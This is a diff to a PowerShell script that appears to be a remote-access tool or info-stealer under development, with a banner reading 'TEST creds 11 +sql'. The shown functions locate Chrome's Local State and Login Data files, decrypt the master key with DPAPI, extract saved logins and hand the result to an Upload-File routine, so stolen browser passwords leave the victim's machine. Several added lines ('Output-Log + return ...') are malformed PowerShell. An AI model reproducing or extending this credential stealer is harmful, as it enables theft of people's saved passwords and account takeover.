@@ -419,14 +419,14 @@ function PortSuggest {
 function Get-DecryptedChromeCreds {
     Add-Type -AssemblyName System.Security
     if (-not (Load-SQLite)) {
-        return "[ERROR] SQLite not loaded"
+        Output-Log + return "[ERROR] SQLite not loaded"
     }
 
     $localStatePath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Local State"
     $loginDataPath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
 
     if (!(Test-Path $localStatePath) -or !(Test-Path $loginDataPath)) {
-        return "[ERROR] Chrome data not found."
+        Output-Log + return "[ERROR] Chrome data not found."
     }
 
     # Получаем ключ дешифровки
@@ -437,14 +437,14 @@ function Get-DecryptedChromeCreds {
             $keyRaw = $localState.os_crypt.app_bound_encrypted_key
         }
         if (-not $keyRaw) {
-            return "[ERROR] No Chrome encrypted key found."
+            Output-Log + return "[ERROR] No Chrome encrypted key found."
         }
 
         $encryptedKey = [Convert]::FromBase64String($keyRaw)
         $encryptedKey = $encryptedKey[5..($encryptedKey.Length - 1)]
         $dpapiKey = [System.Security.Cryptography.ProtectedData]::Unprotect($encryptedKey, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
     } catch {
-        return "[ERROR] Failed to decrypt Chrome master key: $($_.Exception.Message)"
+        Output-Log + return "[ERROR] Failed to decrypt Chrome master key: $($_.Exception.Message)"
     }
 
     # Копируем Login Data
@@ -509,19 +509,24 @@ function Get-DecryptedChromeCreds {
     } catch {
     $errorDetails = $_.Exception | Format-List * -Force | Out-String
     Output-Log "[DEBUG] Exception during Chrome creds extraction:`n$errorDetails"
-    return "[ERROR] Chrome creds extraction failed: $($_.Exception.Message)"
+    Output-Log + return "[ERROR] Chrome creds extraction failed: $($_.Exception.Message)"
     }
 }
 function Get-Credentials {
     try {
         $chromeCreds = Get-DecryptedChromeCreds
+
         if (Test-Path $chromeCreds) {
+            Output-Log "[+] Chrome creds saved to file: $chromeCreds"
             return Upload-File $chromeCreds
         } else {
+            Output-Log "[ERROR] Chrome creds extraction returned non-path result:"
+            Output-Log "$chromeCreds"
             return "[ERROR] Chrome creds extraction failed."
         }
     }
     catch {
+        Output-Log "[ERROR] Unhandled exception in Get-Credentials: $($_.Exception.Message)"
         return "[ERROR] Credential extraction failed: $($_.Exception.Message)"
     }
 }
@@ -755,7 +760,7 @@ ________  ___  ________  ________      ________  ________
     /  /_/__\ \  \ \  \___|\ \  \\\  \ __\ \  \|\  \ \  \_\\ \ 
    |\________\ \__\ \__\    \ \_______\\__\ \_______\ \_______\
     \|_______|\|__|\|__|     \|_______\|__|\|_______|\|_______|  
-                                            TEST creds 10 +sql
+                                            TEST creds 11 +sql
 ${esc}[0m
 
 ${esc}[32m[+] Connected :: $env:USERNAME@$env:COMPUTERNAME
